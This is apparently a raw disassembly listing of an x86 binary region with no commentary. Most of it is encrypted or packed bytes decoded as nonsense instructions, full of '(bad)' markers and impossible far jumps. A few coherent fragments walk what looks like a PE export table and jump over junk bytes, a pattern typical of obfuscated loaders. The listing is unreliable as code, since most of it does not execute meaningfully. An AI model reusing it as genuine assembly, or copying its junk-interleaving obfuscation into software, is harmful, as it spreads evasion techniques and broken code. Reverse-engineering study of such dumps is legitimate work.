  40eb87:	ja     0x40eb3c
  40eb89:	(bad)  
  40eb8a:	cmp    al,ch
  40eb8c:	fadd   st(6),st
  40eb8e:	sahf   
  40eb8f:	mov    al,ds:0x8526491f
  40eb94:	pop    eax
  40eb95:	fcom   DWORD PTR [ecx]
  40eb97:	aaa    
  40eb98:	imul   esi,DWORD PTR [ecx+ecx*2-0x18],0xffffff80
  40eb9d:	xchg   BYTE PTR [eax+0x2f],dh
  40eba0:	xor    DWORD PTR [eax+esi*4+0x17883b7b],0xfffffffc
  40eba8:	ins    BYTE PTR es:[edi],dx
  40eba9:	in     eax,dx
  40ebaa:	add    DWORD PTR [ebp-0x425fb5cf],edi
  40ebb0:	mov    al,ds:0x9de60622
  40ebb5:	inc    esp
  40ebb6:	jp     0x40ec32
  40ebb8:	sub    dl,BYTE PTR [esi-0xb621bb3]
  40ebbe:	into   
  40ebbf:	inc    ebp
  40ebc0:	xchg   edi,eax
  40ebc1:	cmp    eax,0x54c96dff
  40ebc6:	xor    al,0xb2
  40ebc8:	lods   eax,DWORD PTR ds:[esi]
  40ebc9:	jmp    0x40ebbf
  40ebcb:	out    dx,al
  40ebcc:	fwait
  40ebcd:	ja     0x40eb8a
  40ebcf:	das    
  40ebd0:	push   esi
  40ebd1:	pop    ecx
  40ebd2:	xchg   ebp,eax
  40ebd3:	int3   
  40ebd4:	test   al,bl
  40ebd6:	shr    DWORD PTR [ebp+ebp*2-0x4353c007],0x66
  40ebde:	or     eax,DWORD PTR [edi]
  40ebe0:	cli    
  40ebe1:	and    DWORD PTR [ebx-0x2496c44f],esp
  40ebe7:	push   ebx
  40ebe8:	mov    fs,esi
  40ebea:	inc    esp
  40ebeb:	test   eax,0x7c812690
  40ebf0:	gs jnp 0x40eb86
  40ebf3:	jnp    0x40eb96
  40ebf5:	push   edi
  40ebf6:	cmc    
  40ebf7:	pusha  
  40ebf8:	mov    WORD PTR [ebx],gs
  40ebfa:	sbb    al,0x98
  40ebfc:	mov    eax,ds:0x81605ca8
  40ec01:	sub    edx,DWORD PTR [edi-0x45]
  40ec04:	mov    edi,0x6beaeff6
  40ec09:	cld    
  40ec0a:	inc    ecx
  40ec0b:	cmp    BYTE PTR [ebp-0x45a7e21d],ah
  40ec11:	int    0x1b
  40ec13:	imul   eax,DWORD PTR [esp+ebx*4+0x10],0xffffffe1
  40ec18:	pop    edx
  40ec19:	outs   dx,BYTE PTR ds:[esi]
  40ec1a:	(bad)  
  40ec1b:	test   DWORD PTR [ecx+0xa7b82e0],ecx
  40ec21:	in     al,dx
  40ec22:	nop
  40ec23:	jns    0x40ebfb
  40ec25:	sbb    eax,0x5badfb82
  40ec2a:	jnp    0x40ebc5
  40ec2c:	pop    esi
  40ec2d:	mov    ecx,0x66a607e2
  40ec32:	fisttp WORD PTR [ecx+0xb]
  40ec35:	out    0xa0,al
  40ec37:	(bad)  
  40ec39:	xor    al,0x58
  40ec3b:	mov    ebx,0x1fc460d1
  40ec40:	scas   al,BYTE PTR es:[edi]
  40ec41:	or     BYTE PTR [eax-0x1b],dh
  40ec44:	dec    edx
  40ec45:	pop    esp
  40ec46:	push   0x88b0ace3
  40ec4b:	stos   DWORD PTR es:[edi],eax
  40ec4c:	retf   0x6cfc
  40ec4f:	fmul   QWORD PTR fs:[edi+0x1c]
  40ec53:	sbb    bh,BYTE PTR [eax+ebp*4+0x37]
  40ec57:	(bad)  
  40ec58:	xor    ebp,DWORD PTR [edx-0x12e396c9]
  40ec5e:	mov    eax,0x6b5eaae8
  40ec63:	pusha  
  40ec64:	ret    0x3e1b
  40ec67:	retf   
  40ec68:	add    DWORD PTR [ecx+ecx*4-0x15],ecx
  40ec6c:	mov    bh,0xca
  40ec6e:	pop    ebx
  40ec6f:	xchg   edi,eax
  40ec70:	add    al,0x1
  40ec72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec73:	test   DWORD PTR [ebp-0x6042da0d],edi
  40ec79:	or     al,0x8d
  40ec7b:	pop    ebx
  40ec7c:	or     eax,0xb8fef793
  40ec81:	pop    edi
  40ec82:	sub    eax,0xef7ddae3
  40ec87:	mov    al,ds:0x4dca9880
  40ec8c:	in     al,dx
  40ec8d:	in     al,0x6
  40ec8f:	fld    QWORD PTR [ebp-0x55f4dc47]
  40ec95:	lds    ecx,FWORD PTR [ecx]
  40ec97:	ret    0xbb2f
  40ec9a:	xchg   edx,eax
  40ec9b:	(bad)  
  40ec9c:	aam    0x47
  40ec9e:	setae  BYTE PTR [eax-0x79]
  40eca2:	pop    esp
  40eca3:	inc    edx
  40eca4:	lahf   
  40eca5:	push   esi
  40eca6:	and    DWORD PTR [ecx+0x34],ecx
  40eca9:	fisub  WORD PTR [edx+0x4681380b]
  40ecaf:	popa   
  40ecb0:	out    0x2f,al
  40ecb2:	test   eax,0x50fbd046
  40ecb7:	dec    esp
  40ecb8:	mov    ch,0x32
  40ecba:	sub    DWORD PTR [ebp+0x59f7134a],ebx
  40ecc0:	push   es
  40ecc1:	add    ebx,esi
  40ecc3:	mov    BYTE PTR [ebx],bl
  40ecc5:	mov    BYTE PTR [edi],dh
  40ecc7:	adc    al,0xc6
  40ecc9:	pushf  
  40ecca:	retf   
  40eccb:	mov    ch,0xe3
  40eccd:	mov    esp,0xbdf36172
  40ecd2:	dec    edx
  40ecd3:	push   es
  40ecd4:	inc    ecx
  40ecd5:	wrmsr  
  40ecd7:	aaa    
  40ecd8:	inc    eax
  40ecd9:	xor    eax,0x22d92e8f
  40ecde:	jns    0x40ed4d
  40ece0:	or     edi,ebx
  40ece2:	jmp    0x8bec:0x4589e6ba
  40ece9:	inc    ebp
  40ecea:	cld    
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx+0x15c74e77],eax
  40ed29:	lods   al,BYTE PTR ds:[esi]
  40ed2a:	add    al,0xa6
  40ed2c:	jo     0x40ed9e
  40ed2e:	dec    ecx
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ecb3
  40ed33:	mov    ds:0x4565f32c,al
  40ed38:	push   ebp
  40ed39:	or     edi,esi
  40ed3b:	sbb    ebp,DWORD PTR [eax]
  40ed3d:	mov    cl,0x88
  40ed3f:	push   ss
  40ed40:	sub    BYTE PTR [ebp+0x4e5c1eb5],0x68
  40ed47:	enter  0x8889,0xfd
  40ed4b:	or     al,0x6e
  40ed4d:	dec    ebp
  40ed4e:	nop
  40ed4f:	in     eax,0x1f
  40ed51:	shl    esi,0x5e
  40ed54:	push   esi
  40ed55:	pop    eax
  40ed56:	mov    edx,0xa35d9198
  40ed5b:	inc    edi
  40ed5c:	add    eax,0x617908e1
  40ed61:	dec    esp
  40ed62:	movzx  edi,WORD PTR [edx+edi*1]
  40ed66:	arpl   WORD PTR [esi-0x3abc1a71],bx
  40ed6c:	bound  ecx,QWORD PTR [esp+esi*1+0x77]
  40ed70:	retf   
  40ed71:	or     al,0x9b
  40ed73:	and    BYTE PTR ds:0xd48e4103,dh
  40ed79:	in     al,dx
  40ed7a:	push   esi
  40ed7b:	and    dh,BYTE PTR [esi+0x32]
  40ed7e:	push   es
  40ed7f:	imul   edi
  40ed81:	xchg   esi,eax
  40ed82:	jae    0x40ed7d
  40ed84:	nop
  40ed85:	aaa    
  40ed86:	addr16 ja 0x40ed8b
  40ed89:	mov    edx,0x747033e5
  40ed8e:	or     BYTE PTR [ebp+0x4c],bl
  40ed91:	mov    ch,0x3d
  40ed93:	into   
  40ed94:	cli    
  40ed95:	or     al,0x69
  40ed97:	xor    BYTE PTR [eax-0x4489c9fa],cl
  40ed9d:	mov    ds:0x5b5806e8,al
  40eda2:	pop    edx
  40eda3:	fbstp  TBYTE PTR [edx-0x2b]
  40eda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eda7:	mov    fs,WORD PTR [ebx+0x6f973296]
  40edad:	mov    ds:0xafde71f0,al
  40edb2:	add    al,0x19
  40edb4:	pop    ds
  40edb5:	jbe    0x40ee0b
  40edb7:	scas   al,BYTE PTR es:[edi]
  40edb8:	cmp    BYTE PTR [ecx-0x6bf549e9],0xe
  40edbf:	xchg   edx,eax
  40edc0:	scas   eax,DWORD PTR es:[edi]
  40edc1:	sub    DWORD PTR [esi-0x20],esi
  40edc4:	out    dx,al
  40edc5:	outs   dx,BYTE PTR ds:[esi]
  40edc6:	push   cs
  40edc7:	scas   eax,DWORD PTR es:[edi]
  40edc8:	test   eax,0x7e8ae13
  40edcd:	pop    ecx
  40edce:	div    BYTE PTR [edi-0x3d]
  40edd1:	mov    ebx,DWORD PTR [edi+0x75]
  40edd4:	dec    esp
  40edd5:	push   0x39
  40edd7:	int    0xe0
  40edd9:	in     al,dx
  40edda:	pop    edi
  40eddb:	or     eax,0xcae8fe16
  40ede0:	hlt    
  40ede1:	inc    ebx
  40ede2:	push   ebx
  40ede3:	push   0xffffff97
  40ede5:	stos   BYTE PTR es:[edi],al
  40ede6:	(bad)  
  40ede7:	ja     0x40ed8e
  40ede9:	rol    BYTE PTR [ebx+0x3e290016],1
  40edef:	adc    eax,ebp
  40edf1:	mov    ds:0xe093f238,eax
  40edf6:	mov    ecx,0x7ed5cafa
  40edfb:	push   ebx
  40edfc:	jnp    0x40ed90
  40edfe:	(bad)  
  40edff:	push   esp
  40ee00:	adc    eax,0x15149f64
  40ee05:	inc    edx
  40ee06:	ret    
  40ee07:	and    al,0x6c
  40ee09:	ret    0xb8b4
  40ee0c:	ja     0x40ed92
  40ee0e:	ret    0x1d4c
  40ee11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee12:	ja     0x40ee16
  40ee14:	(bad)  
  40ee15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee16:	cmp    DWORD PTR [edi],ecx
  40ee18:	out    0xee,al
  40ee1a:	and    eax,0xb0ce2b15
  40ee20:	(bad)  
  40ee21:	mov    eax,ds:0xcc6cb50
  40ee26:	les    esp,FWORD PTR [esi-0x18]
  40ee29:	pop    edi
  40ee2a:	das    
  40ee2b:	push   edi
  40ee2c:	xchg   ecx,eax
  40ee2d:	(bad)  
  40ee2e:	jp     0x40ee3a
  40ee30:	test   ch,0xb9
  40ee33:	sbb    cl,BYTE PTR [esi+0x19a4272]
  40ee39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee3a:	call   0x5f7191d
  40ee3f:	push   ds
  40ee40:	cmp    al,0xa0
  40ee42:	inc    esp
  40ee43:	jmp    FWORD PTR [ebx]
  40ee45:	cmp    edi,edi
  40ee47:	leave  
  40ee48:	and    dl,0xaf
  40ee4b:	add    eax,0xe974dbff
  40ee50:	push   ebp
  40ee51:	mov    ecx,0x2d78a172
  40ee56:	arpl   WORD PTR [esi-0x1a],bx
  40ee59:	mov    al,0xb8
  40ee5b:	mov    ecx,0xf55765ef
  40ee60:	in     eax,dx
  40ee61:	sbb    DWORD PTR [esp],0x7
  40ee65:	icebp  
  40ee66:	cmp    esp,ebp
  40ee68:	outs   dx,BYTE PTR ds:[esi]
  40ee69:	fadd   QWORD PTR [ebp-0x2d]
  40ee6c:	sbb    cl,dl
  40ee6e:	xor    dh,BYTE PTR [eax+0x40]
  40ee71:	mov    ebx,0x835e78d3
  40ee76:	jae    0x40ee2d
  40ee78:	xor    DWORD PTR [ebx+0x67ed049e],eax
  40ee7e:	sub    eax,0x56db617c
  40ee83:	ret    
  40ee84:	pop    ebx
  40ee85:	push   edi
  40ee86:	adc    al,cl
  40ee88:	cld    
  40ee89:	in     eax,0xf9
  40ee8b:	inc    ebx
  40ee8c:	dec    esi
  40ee8d:	sti    
  40ee8e:	(bad)  
  40ee8f:	jp     0x40ee11
  40ee91:	mov    ebp,0xce47bf26
  40ee96:	into   
  40ee97:	cmp    ah,BYTE PTR [eax]
  40ee99:	nop
  40ee9a:	push   ds
  40ee9b:	repz gs icebp 
  40ee9e:	repz arpl WORD PTR [ecx-0x2d524b3d],sp
  40eea5:	dec    eax
  40eea6:	fisttp DWORD PTR [esi]
  40eea8:	add    cl,BYTE PTR [edx]
  40eeaa:	pop    esp
  40eeab:	jl     0x40eed7
  40eead:	sub    DWORD PTR [eax-0x5],0x7e
  40eeb1:	loope  0x40ee6a
  40eeb3:	or     DWORD PTR [ecx],0xad37b81b
  40eeb9:	jb     0x40ee3d
  40eebb:	aas    
  40eebc:	lods   eax,DWORD PTR ds:[esi]
  40eebd:	iret   
  40eebe:	cdq    
  40eebf:	jns    0x40ee77
  40eec1:	xchg   ecx,edi
  40eec3:	xor    DWORD PTR [ebp+0x7cbc6b34],ebp
  40eec9:	pusha  
  40eeca:	and    al,bh
  40eecc:	jmp    0x100a:0x356810ca
  40eed3:	fnsave [ecx+eiz*2]
  40eed6:	xor    DWORD PTR [ecx-0x7cb42378],0x40
  40eedd:	mov    WORD PTR [ebx+eax*2],?
  40eee0:	iret   
  40eee1:	hlt    
  40eee2:	test   eax,0x2737c49e
  40eee7:	add    DWORD PTR ds:0x3f9a49c2,0x7a
  40eeee:	jmp    0xfae7:0x1c96cd4f
  40eef5:	or     eax,0xc1d575ee
  40eefa:	pusha  
  40eefb:	jg     0x40eebb
  40eefd:	inc    ecx
  40eefe:	out    0x71,eax
  40ef00:	test   DWORD PTR [ebx-0x4051f64a],edi
  40ef06:	outs   dx,DWORD PTR ds:[esi]
  40ef07:	das    
  40ef08:	ret    0xf356
  40ef0b:	mul    DWORD PTR [esi+0x4e2e9ef6]
  40ef11:	sub    al,0xf8
  40ef13:	mov    eax,0xd233e5cd
  40ef18:	mov    edi,0x70bf61f0
  40ef1d:	or     dh,BYTE PTR [eax-0x6e]
  40ef20:	sbb    eax,0x2945c53
  40ef25:	leave  
  40ef26:	or     BYTE PTR [edx+0x58],bl
  40ef29:	(bad)  
  40ef2a:	xchg   ebx,eax
  40ef2b:	out    dx,eax
  40ef2c:	inc    esp
  40ef2d:	nop
  40ef2e:	xor    eax,0xa8c1fe42
  40ef33:	mov    ecx,0x7c5f2352
  40ef38:	jmp    DWORD PTR [eax+esi*2+0x33]
  40ef3c:	add    eax,DWORD PTR [eax]
  40ef3e:	xor    ebp,ebx
  40ef40:	add    al,0xca
  40ef42:	ret    
  40ef43:	mov    ebx,0x87be11b7
  40ef48:	and    al,0xa8
  40ef4a:	sub    DWORD PTR [ebp-0x7910da3e],0x77
  40ef51:	xor    BYTE PTR [eax],bh
  40ef53:	and    bh,bh
  40ef55:	dec    edx
  40ef56:	les    edx,FWORD PTR [esi+0xeafbd7]
  40ef5c:	shr    edi,cl
  40ef5e:	push   ebp
  40ef5f:	adc    esp,esi
  40ef61:	(bad)  
  40ef62:	pop    ss
  40ef63:	fisttp DWORD PTR [ebp-0x77667fde]
  40ef69:	xor    eax,0x76dadfbb
  40ef6e:	mov    ecx,0xaf66ce66
  40ef73:	sub    eax,0xa569afe7
  40ef78:	cdq    
  40ef79:	pop    es
  40ef7a:	daa    
  40ef7b:	outs   dx,BYTE PTR ds:[esi]
  40ef7c:	bound  esi,QWORD PTR [ebx+0x76ccabb5]
  40ef82:	push   edi
  40ef83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef84:	es (bad) 
  40ef86:	pop    esi
  40ef87:	retf   0xcb74
  40ef8a:	pop    ss
  40ef8b:	and    esi,edx
  40ef8d:	xchg   ecx,eax
  40ef8e:	mov    ebp,ecx
  40ef90:	adc    esp,DWORD PTR [esi]
  40ef92:	mov    ah,0x19
  40ef94:	sbb    dl,BYTE PTR [ebx-0x48]
  40ef97:	imul   ebp,DWORD PTR [ecx-0x55],0x45
  40ef9b:	in     eax,dx
  40ef9c:	cli    
  40ef9d:	mov    BYTE PTR [edi],dh
  40ef9f:	inc    edx
  40efa0:	nop
  40efa1:	inc    ebp
  40efa2:	enter  0xf25b,0xc0
  40efa6:	loop   0x40efd3
  40efa8:	inc    ecx
  40efa9:	(bad)  
  40efaa:	jmp    0x368e:0x9cc34f84
  40efb1:	in     eax,dx
  40efb2:	rcl    ch,cl
  40efb4:	inc    ebx
  40efb5:	pusha  
  40efb6:	retf   0x4668
  40efb9:	pop    ecx
  40efba:	dec    edi
  40efbb:	fadd   DWORD PTR [esi+0x3b]
  40efbe:	jo     0x40efcc
  40efc0:	sub    cl,bh
  40efc2:	jmp    0x8f975a1f
  40efc7:	out    0x5c,al
  40efc9:	sub    eax,0xff337fd4
  40efce:	je     0x40ef99
  40efd0:	push   cs
  40efd1:	pusha  
  40efd2:	cld    
  40efd3:	xchg   DWORD PTR gs:[edx],ebx
  40efd6:	push   edi
  40efd7:	sub    DWORD PTR [ecx-0x4f],edx
  40efda:	ins    BYTE PTR es:[edi],dx
  40efdb:	and    DWORD PTR [ebx],edx
  40efdd:	sbb    BYTE PTR [esi+eiz*4-0x27],bh
  40efe1:	inc    edi
  40efe2:	inc    esp
  40efe3:	cmp    BYTE PTR [ebx+0x6817a3b0],ah
  40efe9:	mov    ecx,0x1a36d52f
  40efee:	dec    ebp
  40efef:	mov    cl,0x51
  40eff1:	or     edi,DWORD PTR [esi+edi*4-0x26967f4c]
  40eff8:	popf   
  40eff9:	call   0x1eb6fa3d
  40effe:	and    bh,bl
  40f000:	cdq    
  40f001:	fs (bad) 
  40f003:	cmp    ebp,DWORD PTR [ebp-0x29d572e7]
  40f009:	call   0x3776:0x2fa9fb3f
  40f010:	xchg   esp,eax
  40f011:	and    al,0xf6
  40f013:	hlt    
  40f014:	mov    edi,0x2f47c1b6
  40f019:	fidiv  WORD PTR [edi+eiz*2]
  40f01c:	in     eax,0xbc
  40f01e:	popa   
  40f01f:	test   BYTE PTR [esi-0x5bffd071],bl
  40f025:	sbb    DWORD PTR [edi+eax*2+0x4a],0x7a1a79e7
  40f02d:	scas   al,BYTE PTR es:[edi]
  40f02e:	dec    esi
  40f02f:	xchg   edi,eax
  40f030:	inc    ebx
  40f031:	dec    esi
  40f032:	mov    dl,0x11
  40f034:	outs   dx,DWORD PTR ds:[esi]
  40f035:	fld    TBYTE PTR [ebx]
  40f037:	(bad)  
  40f039:	ss (bad) 
  40f03b:	fldcw  WORD PTR [ebx+0x2523b108]
  40f041:	loop   0x40efc9
  40f043:	jp     0x40f002
  40f045:	or     ecx,ebx
  40f047:	mov    bl,0x2a
  40f049:	push   eax
  40f04a:	scas   al,BYTE PTR es:[edi]
  40f04b:	mov    ds:0x86c2e2e8,eax
  40f050:	or     dl,BYTE PTR [edi-0x2c3cd15e]
  40f056:	mov    al,ds:0x7c45d6be
  40f05b:	cmp    esp,DWORD PTR [ecx-0x3c]
  40f05e:	pop    edi
  40f05f:	mov    esi,esi
  40f061:	sub    DWORD PTR [esi],esi
  40f063:	aas    
  40f064:	(bad)  
  40f065:	mov    ds:0x21ea57fb,eax
  40f06a:	and    dl,dl
  40f06c:	loopne 0x40f0c7
  40f06e:	mov    ecx,0xcd7e0f4f
  40f073:	mov    bh,0xb7
  40f075:	aas    
  40f076:	retf   
  40f077:	popf   
  40f078:	and    BYTE PTR [edx+0x44],dh
  40f07b:	ds stc 
  40f07d:	lds    eax,FWORD PTR [ebp+0x5a]
  40f080:	in     eax,dx
  40f081:	mov    ebx,DWORD PTR [ebx]
  40f083:	adc    dh,BYTE PTR [edx+0x1d]
  40f086:	add    eax,0x1011b3f6
  40f08b:	popa   
  40f08c:	stos   BYTE PTR es:[edi],al
  40f08d:	dec    ebx
  40f08e:	bound  eax,QWORD PTR [ecx]
  40f090:	push   esp
  40f091:	call   0xd9392061
  40f096:	cmp    cl,al
  40f098:	imul   esp,DWORD PTR [edx-0x1dadf344],0x1c
  40f09f:	or     ah,BYTE PTR [edx+0x29596d3a]
  40f0a5:	sub    DWORD PTR [ecx],ebp
  40f0a7:	adc    eax,0xe4566c71
  40f0ac:	mov    al,ds:0x89553926
  40f0b1:	loop   0x40f035
  40f0b3:	and    DWORD PTR [edx],esp
  40f0b5:	sub    eax,0x30d698a6
  40f0ba:	add    al,0x25
  40f0bc:	mov    cl,BYTE PTR [ebx-0x5bd2a7df]
  40f0c2:	addr16 sbb eax,ebp
  40f0c5:	ins    BYTE PTR es:[edi],dx
  40f0c6:	sbb    eax,0x63ddaba
  40f0cb:	out    dx,eax
  40f0cc:	lahf   
  40f0cd:	shl    BYTE PTR [edi-0x74],cl
  40f0d0:	cld    
  40f0d1:	fndisi(8087 only) 
  40f0d3:	xor    ecx,ebp
  40f0d5:	leave  
  40f0d6:	stos   DWORD PTR es:[edi],eax
  40f0d7:	sbb    al,0x67
  40f0d9:	jbe    0x40f13a
  40f0db:	arpl   WORD PTR [eax],sp
  40f0dd:	(bad)  
  40f0de:	xor    al,BYTE PTR [esi]
  40f0e0:	lods   al,BYTE PTR ds:[esi]
  40f0e1:	sti    
  40f0e2:	rcl    DWORD PTR [edi+0x69e1e391],cl
  40f0e8:	xor    DWORD PTR ds:0x96ec6406,ebx
  40f0ee:	push   ecx
  40f0ef:	les    edi,FWORD PTR [edx-0xc]
  40f0f2:	iret   
  40f0f3:	icebp  
  40f0f4:	and    al,0xaa
  40f0f6:	arpl   bp,bp
  40f0f8:	add    eax,0x97c8dfeb
  40f0fd:	repz call 0x91662590
  40f103:	sub    edi,DWORD PTR [eax]
  40f105:	mov    ss,WORD PTR [eax+eiz*2+0x12]
  40f109:	add    ecx,DWORD PTR [eax+0x24]
  40f10c:	mov    DWORD PTR [ebp-0x2c],ecx
  40f10f:	mov    eax,DWORD PTR [ebp-0x14]
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0xbf
  40f12a:	loop   0x40f129
  40f12c:	jb     0x40f18b
  40f12e:	mov    ds:0x7d497070,eax
  40f133:	jo     0x40f1a5
  40f135:	call   0x334a15ff
  40f13a:	retf   0x7bff
  40f13d:	lods   al,BYTE PTR ds:[esi]
  40f13e:	jnp    0x40f1ae
  40f140:	in     al,dx
  40f141:	in     eax,dx
  40f142:	dec    edx
  40f143:	add    dl,ch
  40f145:	mov    cl,0x2d
  40f147:	jmp    0x40f195
  40f149:	aad    0x97
  40f14b:	mov    bh,BYTE PTR [edx]
  40f14d:	push   edx
  40f14e:	cs cli 
  40f150:	jae    0x40f10a
  40f152:	pop    ebx
  40f153:	push   esp
  40f154:	pop    ebx
  40f155:	adc    ebx,edi
  40f157:	es in  eax,dx
  40f159:	push   edx
  40f15a:	int3   
  40f15b:	mov    eax,ds:0x98d404ae
  40f160:	pop    es
  40f161:	ins    DWORD PTR es:[edi],dx
  40f162:	sub    ah,BYTE PTR [esi]
  40f164:	ins    BYTE PTR es:[edi],dx
  40f165:	lds    edx,FWORD PTR [eax-0x1a]
  40f168:	pop    es
  40f169:	fs xor al,0xeb
  40f16c:	pushf  
  40f16d:	inc    ecx
  40f16e:	mov    dl,BYTE PTR [eax-0x4f6b5b2d]
  40f174:	in     eax,0xce
  40f176:	hlt    
  40f177:	or     al,0xd5
  40f179:	jge    0x40f185
  40f17b:	cmp    esp,DWORD PTR ds:[ecx]
  40f17e:	jne    0x40f198
  40f180:	loopne 0x40f1d6
  40f182:	fidiv  WORD PTR [ebx]
  40f184:	sub    al,0x21
  40f186:	pop    ds
  40f187:	pop    esi
  40f188:	pop    edx
  40f189:	add    ebp,DWORD PTR [esi]
  40f18b:	xchg   esi,eax
  40f18c:	int    0x20
  40f18e:	push   0x71ff3a39
  40f193:	or     bl,BYTE PTR [ecx]
  40f195:	dec    ecx
  40f196:	xchg   BYTE PTR [edx-0x26],dl
  40f199:	loope  0x40f1fa
  40f19b:	shl    DWORD PTR [ebp+0x60],1
  40f19e:	shl    DWORD PTR [esp+eax*4],1
  40f1a1:	sub    ebp,esp
  40f1a3:	xchg   ecx,eax
  40f1a4:	test   eax,0xa24dbf57
  40f1a9:	fisttp WORD PTR [edx+ebx*1+0x1e]
  40f1ad:	icebp  
  40f1ae:	pop    esp
  40f1af:	dec    ecx
  40f1b0:	cmp    ebx,DWORD PTR [edi+0x4ba66216]
  40f1b6:	dec    ecx
  40f1b7:	mov    ds:0x4b70baca,al
  40f1bc:	rcr    BYTE PTR [ebx+0x5b],cl
  40f1bf:	in     al,0x33
  40f1c1:	mov    bl,BYTE PTR [edx+0x65]
  40f1c4:	enter  0x6e00,0x52
  40f1c8:	add    BYTE PTR [edx+edx*4-0x75d97d13],0xe8
  40f1d0:	jbe    0x40f212
  40f1d2:	mov    ebx,0xfa2c1bc5
  40f1d7:	scas   eax,DWORD PTR es:[edi]
  40f1d8:	loopne 0x40f240
  40f1da:	sub    cl,BYTE PTR [ebx-0x6e]
  40f1dd:	stos   DWORD PTR es:[edi],eax
  40f1de:	js     0x40f1c9
  40f1e0:	cmp    BYTE PTR [esi],ch
  40f1e2:	jno    0x40f23c
  40f1e4:	(bad)  
  40f1e5:	ror    DWORD PTR [edi+0x49],1
  40f1e8:	mov    cs,WORD PTR [ebp+0x1a]
  40f1eb:	mov    edi,0xfb4f8969
  40f1f0:	and    BYTE PTR [edx-0x64],cl
  40f1f3:	retf   
  40f1f4:	inc    esp
  40f1f5:	lahf   
  40f1f6:	jecxz  0x40f1b3
  40f1f8:	push   ecx
  40f1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1fa:	loop   0x40f18a
  40f1fc:	test   edi,ebx
  40f1fe:	out    0xd9,al
  40f200:	dec    esi
  40f201:	jl     0x40f1ea
  40f203:	cmp    ebx,0x56
  40f206:	enter  0x9c29,0x57
  40f20a:	dec    esp
  40f20b:	jmp    0xe6b45c9e
  40f210:	add    DWORD PTR [edx-0x3b],esp
  40f213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f214:	or     ah,ah
  40f216:	mov    ds:0x1c25ac44,al
  40f21b:	xor    bh,cl
  40f21d:	mov    dh,0xe4
  40f21f:	jp     0x40f1a3
  40f221:	rcr    BYTE PTR [esi],1
  40f223:	sti    
  40f224:	test   al,0x95
  40f226:	jp     0x40f248
  40f228:	xor    DWORD PTR [edi],esp
  40f22a:	or     eax,0xd0cf4db0
  40f22f:	ja     0x40f200
  40f231:	cmp    al,ch
  40f233:	(bad)  
  40f234:	add    dh,BYTE PTR [ecx+0x277248b0]
  40f23a:	adc    eax,0x12beed06
  40f23f:	mov    esi,0xa7202d97
  40f244:	lahf   
  40f245:	mov    ecx,0xe3af0621
  40f24a:	ins    BYTE PTR es:[edi],dx
  40f24b:	pop    esp
  40f24c:	shl    DWORD PTR [ebx+0x467b2dac],1
  40f252:	push   ebp
  40f253:	dec    edx
  40f254:	es dec edi
  40f256:	arpl   WORD PTR [eax+esi*1+0xa],di
  40f25a:	xor    eax,0x89f46120
  40f25f:	push   ds
  40f260:	xor    eax,0xda25ada4
  40f265:	dec    esi
  40f266:	xchg   esi,eax
  40f267:	int3   
  40f268:	jmp    0x8afe:0x103216e4
  40f26f:	sbb    BYTE PTR [edi-0x3f],ah
  40f272:	jmp    0xe9791f6f
  40f277:	sti    
  40f278:	push   ecx
  40f279:	push   cs
  40f27a:	add    DWORD PTR [ebx*1-0x27145969],eax
  40f281:	imul   eax,eax,0x2e
  40f284:	imul   DWORD PTR [ecx+0x20]
  40f287:	xchg   BYTE PTR [edx+0xe0a710b],ch
  40f28d:	mov    esp,es
  40f28f:	mul    BYTE PTR [edi]
  40f291:	xchg   DWORD PTR [ecx-0x7ff07a28],edx
  40f297:	push   0x48
  40f299:	test   eax,0x845cfebf
  40f29e:	stos   DWORD PTR es:[edi],eax
  40f29f:	adc    eax,0x2aa8ed07
  40f2a4:	stc    
  40f2a5:	or     esp,DWORD PTR [ecx-0xf012687]
  40f2ab:	jbe    0x40f295
  40f2ad:	dec    edi
  40f2ae:	adc    eax,0x7548f637
  40f2b3:	or     cl,BYTE PTR [edx+0x14]
  40f2b6:	xchg   esp,eax
  40f2b7:	in     eax,dx
  40f2b8:	arpl   WORD PTR [ebx],bx
  40f2ba:	pop    ds
  40f2bb:	xchg   edi,eax
  40f2bc:	int3   
  40f2bd:	pop    es
  40f2be:	test   DWORD PTR [ebp-0x1d],ebx
  40f2c1:	sti    
  40f2c2:	mov    bh,0x73
  40f2c4:	leave  
  40f2c5:	aad    0x1e
  40f2c7:	xor    ecx,DWORD PTR [edx+0x66]
  40f2ca:	mov    cs,eax
  40f2cc:	xlat   BYTE PTR es:[ebx]
  40f2ce:	mov    DWORD PTR [esi-0x5c3d8e80],edi
  40f2d4:	adc    edi,DWORD PTR [esi]
  40f2d6:	retf   0x9a86
  40f2d9:	add    BYTE PTR [eax+0x1],cl
  40f2dc:	lock pushf 
  40f2de:	mov    al,0x19
